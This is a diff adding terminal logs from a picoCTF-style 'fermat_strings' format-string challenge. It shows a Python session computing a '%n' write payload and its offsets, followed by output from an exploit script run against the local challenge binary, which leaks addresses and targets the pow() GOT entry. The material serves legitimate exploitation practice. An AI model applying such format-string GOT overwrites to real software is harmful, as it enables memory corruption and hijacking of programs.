@@ -1,0 +1,36 @@
+hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself$ python3
+Python 3.10.12 (main, Jun 11 2023, 05:26:28) [GCC 11.4.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> len("1_______%4196361p%11$n--")
+24
+>>> len("Calculating for A: 11111111@\x10` and B: 1_______")
+46
+>>> 0x400837
+4196407
+>>> 0x400809
+4196361
+>>> 4196407 - 4196361
+46
+
+
+-------------------------
+
+
+hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings$ python3 exploit_pow_main.py
+[*] '/mnt/d/pwn_myself/Pico/fermat_strings/chall'
+    Arch:     amd64-64-little
+[*] '/mnt/d/pwn_myself/Pico/fermat_strings/chall'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Starting local process './chall': pid 24860
+[*] running in new terminal: ['/usr/bin/gdb', '-q', './chall', '24860', '-x', '/tmp/pwnj63xhhen.gdb']
+[-] Waiting for debugger: debugger exited! (maybe check /proc/sys/kernel/yama/ptrace_scope)
+[*] Main address: 0x400837
+[*] pow() GOT address: 0x601040
+16
+[*] Switching to interactive mode
+Calculating for A: 11111111@\x10` and B: 1_______0x400bd8--------
+$
